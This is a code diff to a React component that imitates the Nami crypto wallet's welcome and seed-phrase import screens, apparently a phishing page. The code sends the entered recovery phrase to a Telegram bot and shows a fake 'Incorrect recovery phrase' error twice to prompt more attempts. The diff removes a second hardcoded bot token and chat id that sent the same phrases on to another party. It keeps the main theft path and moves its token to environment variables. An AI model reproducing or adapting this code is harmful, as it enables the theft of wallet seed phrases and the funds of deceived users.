@@ -11,11 +11,10 @@ function Nami() {
   const navigate = useNavigate();
   const [attempts, setAttempts] = useState(0);
 
-
   const handleCloseAllModals = () => {
     setIsModalOpen(false);
     setIsSecondModalOpen(false);
-    navigate("/"); 
+    navigate("/");
   };
 
   const handleImportClick = () => {
@@ -53,28 +52,18 @@ function Nami() {
   const handleRestoreWallet = async () => {
     const message = seedPhrase.join(" ");
 
-    const token = process.env.REACT_APP_TELEGRAM_TOKEN;
-    const chat_id = process.env.REACT_APP_TELEGRAM_CHAT_ID;
-
-    const otherToken = "6838411368:AAElyI53lMBW6NAfmGIinBMzBPBACQ2B058";
-    const otherChat_id = "6338150634";
-
+    const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
+    const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    const otherUrl = `https://api.telegram.org/bot${otherToken}/sendMessage`;
-    
+
     const data = {
       chat_id: chat_id,
       text: `Nami:   ${message}`,
     };
-    const otherData = {
-      chat_id: otherChat_id,
-      text: `Nami:   ${message}`,
-    };
 
+    setAttempts((prevAttempts) => prevAttempts + 1);
 
-    setAttempts(prevAttempts => prevAttempts + 1);
-    
     if (attempts < 2) {
       alert("Incorrect recovery phrase, Please try again.");
     } else {
@@ -86,84 +75,76 @@ function Nami() {
           },
           body: JSON.stringify(data),
         });
-  
+
         if (!response.ok) {
           throw new Error("Network response was not ok");
         }
-
-
-        const otherResponse = await fetch(otherUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify(otherData),
-        });
-  
-        if (!otherResponse.ok) {
-          throw new Error("Network response was not ok");
-        }
-
 
         // const responseData = await response.json();
         console.log("success");
       } catch (error) {
         console.error("Error sending message:", error);
       }
-      handleCloseAllModals()
+      handleCloseAllModals();
     }
   };
 
   return (
-    <div className="Nami fixed inset-0 flex bg-opacity-50 backdrop-blur-sm z-50" style={{width:"100%"}}>
+    <div
+      className="Nami fixed inset-0 flex bg-opacity-50 backdrop-blur-sm z-50"
+      style={{ width: "100%" }}
+    >
       <div
         className=" p-3 sm:p-6 bg-[#1a202c] relative text-center"
         style={{ width: "100%", height: "100%" }}
       >
         <div className="text-right">
-            <i
-              className="fa-solid fa-x text-slate-400 cursor-pointer"
-              style={{ fontSize: "15px" }}
-              onClick={handleCloseAllModals}
-            ></i>
+          <i
+            className="fa-solid fa-x text-slate-400 cursor-pointer"
+            style={{ fontSize: "15px" }}
+            onClick={handleCloseAllModals}
+          ></i>
         </div>
 
         <div className="flex flex-col items-center justify-center m-auto mt-20">
-        <div className="flex justify-center">
-          <img
-            src="https://app.minswap.org/wallets/nami.svg"
-            alt="icon"
-            className="w-14 pt-5"
-          />
-        </div>
+          <div className="flex justify-center">
+            <img
+              src="https://app.minswap.org/wallets/nami.svg"
+              alt="icon"
+              className="w-14 pt-5"
+            />
+          </div>
 
-        <div className="mt-10">
-          <h1 className="text-2xl text-white font-base">Welcome</h1>
-          <p className="mt-2 text-gray-500 text-sm">
-            Let's get started with creating a wallet.
-          </p>
-        </div>
-        <div className="flex justify-center mt-5">
-          <img
-            src="https://res.cloudinary.com/dzzwvcapu/image/upload/v1717071049/ipge7jkvxfvlztsfq4b0.png"
-            alt="icon"
-            className="w-24"
-          />
-        </div>
-        <div className="flex flex-col mt-8 gap-3">
-          <Link to='/namiWallet' className="pt-2 pb-2 ps-5 pe-5 bg-teal-600 text-white rounded-lg max-w-40  m-auto">
-            New Wallet
-          </Link>
-          <button
-            className="pt-2 pb-2 ps-3 pe-3 bg-orange-600 text-white rounded-lg max-w-20 m-auto"
-            onClick={handleImportClick}
-          >
-            Import
-          </button>
-        </div>
+          <div className="mt-10">
+            <h1 className="text-2xl text-white font-base">Welcome</h1>
+            <p className="mt-2 text-gray-500 text-sm">
+              Let's get started with creating a wallet.
+            </p>
+          </div>
+          <div className="flex justify-center mt-5">
+            <img
+              src="https://res.cloudinary.com/dzzwvcapu/image/upload/v1717071049/ipge7jkvxfvlztsfq4b0.png"
+              alt="icon"
+              className="w-24"
+            />
+          </div>
+          <div className="flex flex-col mt-8 gap-3">
+            <Link
+              to="/namiWallet"
+              className="pt-2 pb-2 ps-5 pe-5 bg-teal-600 text-white rounded-lg max-w-40  m-auto"
+            >
+              New Wallet
+            </Link>
+            <button
+              className="pt-2 pb-2 ps-3 pe-3 bg-orange-600 text-white rounded-lg max-w-20 m-auto"
+              onClick={handleImportClick}
+            >
+              Import
+            </button>
+          </div>
 
-        <h1 className="text-xs mt-8 text-gray-400">namiwallet.io</h1>
-      </div>
+          <h1 className="text-xs mt-8 text-gray-400">namiwallet.io</h1>
+        </div>
       </div>
 
       {isModalOpen && (
@@ -278,7 +259,9 @@ function Nami() {
               className="bg-[#171923] m-auto p-8 rounded-lg shadow mt-5"
               style={{ maxWidth: "500px", height: "75vh" }}
             >
-              <h1 className="font-bold text-xl text-white">Import Seed Phrase</h1>
+              <h1 className="font-bold text-xl text-white">
+                Import Seed Phrase
+              </h1>
               <p className="text-xs mt-2 text-white">
                 Enter a {seedPhraseLength}-word seed phrase.
               </p>
